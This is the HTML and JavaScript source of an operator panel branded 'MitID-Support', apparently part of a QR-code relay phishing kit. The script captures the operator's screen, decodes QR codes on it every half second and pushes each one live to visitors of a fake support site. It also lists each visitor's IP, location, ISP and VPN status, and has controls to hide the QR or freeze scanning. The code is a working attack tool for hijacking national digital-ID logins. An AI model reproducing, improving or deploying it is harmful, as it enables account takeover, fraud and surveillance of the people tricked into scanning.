<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8"/>
  <meta name="viewport" content="width=device-width,initial-scale=1"/>
  <title>Admin Panel - Support QR</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet"/>
  <script src="/socket.io/socket.io.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/jsqr@1.4.0/dist/jsQR.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script>
  <style>
    body{background:#f8f9fa;}
    .container{max-width:1100px;}
    #debugLog{background:#eee;padding:10px;height:200px;overflow:auto;font-size:13px;}
    .muted-row{color:#6c757d;}
  </style>
</head>
<body>
  <div class="container my-4">
    <div class="d-flex align-items-center mb-3">
      <img src="https://i.postimg.cc/WzDHPTPX/logo.jpg" alt="logo" style="width:50px;margin-right:12px;">
      <h3 class="m-0">MitID-Support — Admin Panel</h3>
    </div>

    <div class="alert alert-info">
      Users navigate to: <strong><span id="siteUrl"></span></strong>
    </div>

    <div class="mb-3">
      <button id="start" class="btn btn-success">Start Stream</button>
      <button id="stop" class="btn btn-danger">Stop Stream</button>
      <button id="hide" class="btn btn-warning">Hide QR</button>
      <button id="show" class="btn btn-info">Show QR</button>
      <button id="freeze" class="btn btn-secondary">Freeze Scan</button>
      <button id="unfreeze" class="btn btn-light">Unfreeze Scan</button>
    </div>

    <p>Status: <span id="status">Idle</span> | Hidden: <span id="hiddenStatus">No</span> | Frozen: <span id="frozenStatus">No</span> | Ping: <span id="adminPing">0</span>ms</p>

    <h5>Connected Clients (<span id="clientCount">0</span>)</h5>
    <div style="max-height:250px;overflow-y:auto;">
      <table class="table table-striped table-sm">
        <thead class="table-dark">
          <tr><th>User</th><th>IP</th><th>City</th><th>Region</th><th>Country</th><th>ISP</th><th>VPN/VPS</th><th>Ping</th></tr>
        </thead>
        <tbody id="clientListBody"></tbody>
      </table>
    </div>

    <h5>QR Preview</h5>
    <div id="qrCanvas"></div>
    <h5 class="mt-3">Screen Capture Preview</h5>
    <video id="video" width="640" height="360" autoplay style="border:1px solid #ccc"></video>
    <canvas id="canvas" style="display:none"></canvas>
    <h5 class="mt-3">Debug Log</h5>
    <div id="debugLog"></div>
  </div>

<script>
(() => {
  const socket = io();
  socket.emit('join','admin');
  document.getElementById('siteUrl').textContent = window.location.origin;
  const qrCanvasDiv = document.getElementById('qrCanvas');
  const clientListBody = document.getElementById('clientListBody');
  const log = (m)=>{const p=document.createElement('p');p.textContent=new Date().toLocaleTimeString()+" - "+m;debugLog.appendChild(p);debugLog.scrollTop=debugLog.scrollHeight;}
  let stream=null, interval=null, lastQr=null, isHidden=false;

  document.getElementById('start').onclick=startStream;
  document.getElementById('stop').onclick=stopStream;
  document.getElementById('hide').onclick=()=>toggleHide(true);
  document.getElementById('show').onclick=()=>toggleHide(false);

  socket.on('client_list',list=>{
    clientListBody.innerHTML='';
    clientCount.textContent=list.length;
    list.forEach(c=>{
      const tr=document.createElement('tr');
      if(/Not logged/.test(c.username))tr.classList.add('muted-row');
      tr.innerHTML=`<td>${c.username}</td><td>${c.ip}</td><td>${c.city}</td><td>${c.region}</td><td>${c.countryFlag||''} ${c.country}</td><td>${c.isp}</td><td>${c.vpn?'✅':'❌'}</td><td>${c.ping||''}</td>`;
      clientListBody.appendChild(tr);
    });
  });

  socket.on('qr_preview',v=>{
    qrCanvasDiv.innerHTML='';
    if(v&&!isHidden)new QRCode(qrCanvasDiv,{text:v,width:128,height:128});
  });
  socket.on('hide_state',h=>{isHidden=h;qrCanvasDiv.innerHTML='';if(!h&&lastQr)new QRCode(qrCanvasDiv,{text:lastQr,width:128,height:128});});

  async function startStream(){
    try{
      stream=await navigator.mediaDevices.getDisplayMedia({video:true});
      video.srcObject=stream;video.muted=true;await video.play();
      interval=setInterval(scan,500);
      socket.emit('start_stream');log('Stream started');
    }catch(e){log('Error: '+e.message);}
  }
  function stopStream(){
    if(stream)stream.getTracks().forEach(t=>t.stop());
    clearInterval(interval);interval=null;stream=null;
    socket.emit('stop_stream');log('Stream stopped');
  }
  function toggleHide(h){isHidden=h;socket.emit('toggle_hide',h);}
  function scan(){
    if(!video.videoWidth)return;
    const c=canvas,ctx=c.getContext('2d');
    c.width=video.videoWidth;c.height=video.videoHeight;
    ctx.drawImage(video,0,0,c.width,c.height);
    const img=ctx.getImageData(0,0,c.width,c.height);
    const code=jsQR(img.data,img.width,img.height);
    if(code&&code.data!==lastQr){
      lastQr=code.data;
      socket.emit('qr_update',code.data);
      qrCanvasDiv.innerHTML='';
      if(!isHidden)new QRCode(qrCanvasDiv,{text:code.data,width:128,height:128});
      log('Detected: '+code.data);
    }
  }
})();
</script>
</body>
</html>
